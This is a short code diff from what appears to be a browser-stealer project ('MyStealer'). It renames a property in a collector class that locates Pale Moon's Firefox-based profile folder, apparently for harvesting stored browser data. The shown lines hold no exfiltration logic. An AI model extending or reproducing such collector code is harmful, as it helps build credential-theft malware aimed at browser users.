@@ -5,7 +5,7 @@ namespace MyStealer.Collectors.Browser.FirefoxBased
 {
     internal class PaleMoon : Firefox
     {
-        public override string ApplicationName => "Pale Moon";
+        public override string ModuleName => "Pale Moon";
 
         protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions", "Pale Moon", "Profiles");
 
